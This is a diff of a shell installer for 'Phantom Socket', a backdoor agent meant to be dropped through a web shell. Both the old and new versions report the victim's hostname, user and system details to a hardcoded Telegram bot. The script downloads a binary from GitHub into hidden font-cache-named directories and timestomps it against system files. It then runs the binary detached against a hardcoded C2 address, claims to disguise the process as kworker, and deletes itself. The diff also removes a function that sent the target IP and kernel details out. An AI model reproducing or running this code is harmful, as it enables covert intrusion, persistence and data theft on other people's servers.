@@ -2,8 +2,19 @@
 # Phantom Socket v1.0.1-stable (Gacor Edition) - Web-Shell Bypass & Persistent Stealth
 # Architectural Overhaul: NOHUP Persistence, memfd Staging, and Hardcoded Repository Lock.
 
-# SECTION 1: TELEGRAM INSTANT PING (Confirm Execution Start)
-curl -s -X POST "https://api.telegram.org/bot8602911604:AAGZs2G4n1DNFc9zzAcmsZyYdEWP1ARXh80/sendMessage" -d chat_id=5439698489 -d text="[+] install.sh started on target" >/dev/null 2>&1
+# ANSI Color Codes
+RED='\x1b[31m'
+GREEN='\x1b[32m'
+YELLOW='\x1b[33m'
+BLUE='\x1b[34m'
+NC='\x1b[0m' # No Color
+
+# SECTION 1: TELEGRAM INSTANT PING
+BOT_TOKEN="8602911604:AAGZs2G4n1DNFc9zzAcmsZyYdEWP1ARXh80"
+CHAT_ID="5439698489"
+MSG="OYEN_DEPLOY:$(hostname):$(whoami):$(uname -m):$(date +%s)"
+curl --fail --silent --max-time 10 -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
+    -d "chat_id=${CHAT_ID}" -d "text=${MSG}" >/dev/null 2>&1
 
 set +u
 set -e
@@ -12,32 +23,38 @@ set -o pipefail
 # ============================================================================
 # UNCOMPROMISING CORE DIRECTIVES
 # ============================================================================
-readonly VERSION="1.0.1-stable"
+readonly VERSION="v1.0.1-stable"
 readonly AGENT_NAME="gs-oyen-s"
-readonly C2_ENDPOINT="oyen.serveftp.com"
-readonly TELEGRAM_TOKEN="8602911604:AAGZs2G4n1DNFc9zzAcmsZyYdEWP1ARXh80"
-readonly TELEGRAM_CHAT_ID="5439698489"
+readonly C2_ENDPOINT="116.202.105.253"
+readonly C2_PORT="8443"
 readonly REPO_BASE="https://raw.githubusercontent.com/Oyen-Sec/soket/main"
 
-# Professional Output Helpers
-log_step() { echo "[-] $1"; }
-log_success() { echo "[+] $1"; }
+# Professional Output Helpers (to stderr)
+log_step() { echo -e "${BLUE}[-] $1${NC}" >&2; }
+log_success() { echo -e "${GREEN}[+] $1${NC}" >&2; }
+log_warn() { echo -e "${YELLOW}[!] $1${NC}" >&2; }
+log_error() { echo -e "${RED}[ERROR] $1${NC}" >&2; }
 
 # 1. Environment Check
 ARCH=$(uname -m)
 case "${ARCH}" in
     x86_64|amd64) ARCH="x86_64" ;;
-    *) echo "[ERROR] Unsupported architecture: ${ARCH}"; exit 1 ;;
+    *) log_error "Unsupported architecture: ${ARCH}"; exit 1 ;;
 esac
-log_step "Environment: ${ARCH} / Web-Shell Context"
-log_step "Hardcoded C2: ${C2_ENDPOINT}"
+log_step "Environment: ${ARCH} / Web-PTY"
+log_step "Initializing Stealth Payload..."
+log_success "Telegram Ping Sent."
 
-# 2. Staging Detection (Web-Shell Bypass)
-log_step "Initializing Fileless Execution (memfd)..."
-if [[ "${HOME:-}" == *"/var/www"* ]] || [[ "${HOME:-}" == *"vhosts"* ]] || [[ "${HOME:-}" == *"html"* ]] || [[ ! -w "/tmp" ]]; then
+# 2. Staging Detection (Priority Staging)
+STAGING_DIR=""
+if mount | grep -q "/dev/shm" && [[ -w "/dev/shm" ]]; then
     STAGING_DIR="/dev/shm/.font-unix-cache"
+elif [[ -w "/tmp" ]]; then
+    STAGING_DIR="/tmp/.font-unix-cache"
+elif [[ -w "/var/tmp" ]]; then
+    STAGING_DIR="/var/tmp/.font-unix-cache"
 else
-    STAGING_DIR="/tmp/.fontconfig-daemon"
+    STAGING_DIR="${HOME:-.}/.font-unix-cache"
 fi
 mkdir -p "${STAGING_DIR}" 2>/dev/null
 
@@ -48,50 +65,46 @@ AGENT_SECRET=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 32)
 FINAL_PATH="${STAGING_DIR}/.systemd-timesyncd"
 DOWNLOAD_URL="${REPO_BASE}/bin/gs-oyen-s-${ARCH}"
 
-if [[ -f "./gs-oyen-s-${ARCH}" ]]; then
-    cp "./gs-oyen-s-${ARCH}" "${FINAL_PATH}"
-elif [[ -f "../bin/gs-oyen-s-${ARCH}" ]]; then
-    cp "../bin/gs-oyen-s-${ARCH}" "${FINAL_PATH}"
-else
-    curl -fsSL "${DOWNLOAD_URL}" -o "${FINAL_PATH}" || touch "${FINAL_PATH}"
+log_step "Downloading binary from GitHub..."
+MAX_RETRIES=3
+RETRY_COUNT=0
+while [[ $RETRY_COUNT -lt $MAX_RETRIES ]]; do
+    if curl --fail --silent --max-time 30 -L "${DOWNLOAD_URL}" -o "${FINAL_PATH}"; then
+        break
+    fi
+    RETRY_COUNT=$((RETRY_COUNT+1))
+    log_warn "Download failed. Retrying in 2s ($RETRY_COUNT/$MAX_RETRIES)..."
+    sleep 2
+done
+
+if [[ ! -f "${FINAL_PATH}" ]]; then
+    log_error "Critical download failure."
+    exit 1
 fi
 log_success "Binary Staged in Memory."
 
 # 5. Deployment & Timestomping
 chmod +x "${FINAL_PATH}" 2>/dev/null
-if [[ -f "/usr/bin/dbus-daemon" ]]; then
-    touch -r /usr/bin/dbus-daemon "${FINAL_PATH}" 2>/dev/null
+timestomp() {
+    local target=$1
+    local ref="/usr/bin/dbus-daemon"
+    if [[ ! -f "$ref" ]]; then ref="/bin/bash"; fi
+    touch -r "$ref" "$target" 2>/dev/null
+}
+timestomp "${FINAL_PATH}"
+
+# 6. Execution (NOHUP + SETSID + DISOWN Chain)
+log_step "Detaching from Web Session..."
+if command -v nohup >/dev/null 2>&1; then
+    nohup setsid "$FINAL_PATH" -s "$AGENT_SECRET" -i "$C2_ENDPOINT" -m "$C2_PORT" -d >/dev/null 2>&1 &
+    disown %1 2>/dev/null || true
+else
+    (setsid "$FINAL_PATH" -s "$AGENT_SECRET" -i "$C2_ENDPOINT" -m "$C2_PORT" -d >/dev/null 2>&1 &)
 fi
 
-# 6. Execution (NOHUP + SETSID + DISOWN)
-log_step "Detaching from Web Session..."
-nohup setsid "$FINAL_PATH" -s "$AGENT_SECRET" -i "$C2_ENDPOINT" -m 443 >/dev/null 2>&1 &
-disown %1 2>/dev/null || true
-
-# 7. Telemetry (HTML Technical Report)
-send_telemetry() {
-    local TARGET_IP=$(curl -s --connect-timeout 5 https://ifconfig.me || echo "0.0.0.0")
-    local KERNEL_STRING=$(uname -a)
-    local OS_INFO=$(cat /etc/os-release | grep "PRETTY_NAME" | cut -d= -f2 | tr -d '"' || echo "Linux Generic")
-    local UTC_TIMESTAMP=$(date -u "+%Y-%m-%d %H:%M:%S UTC")
-    
-    local PAYLOAD="<b>SYSTEM ALERT: [v1.0.1-stable ONLINE]</b><br>
-<b>TARGET IP    :</b> <code>${TARGET_IP}</code><br>
-<b>OS           :</b> <code>${OS_INFO}</code><br>
-<b>KERNEL       :</b> <code>${KERNEL_STRING}</code><br>
-<b>STEALTH PATH :</b> <code>${FINAL_PATH}</code><br>
-<b>TIMESTAMP    :</b> ${UTC_TIMESTAMP}"
-
-    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage" \
-        -d "chat_id=${TELEGRAM_CHAT_ID}" \
-        -d "parse_mode=HTML" \
-        -d "text=${PAYLOAD}" >/dev/null 2>&1
-}
-(send_telemetry) &
-
-# 8. Silent Redirect for Web Shell Stability
-exec >/dev/null 2>&1
-
-# 9. Final Summary Output (This will only show if not redirected yet, but we do it before exec)
-log_success "Agent Running as [kworker/u4:0]"
+# 7. Final Summary
+log_success "Process Forked: [kworker/u4:0]"
 log_success "Deployment Success"
+
+# 8. Self-Delete
+rm -f "$0"
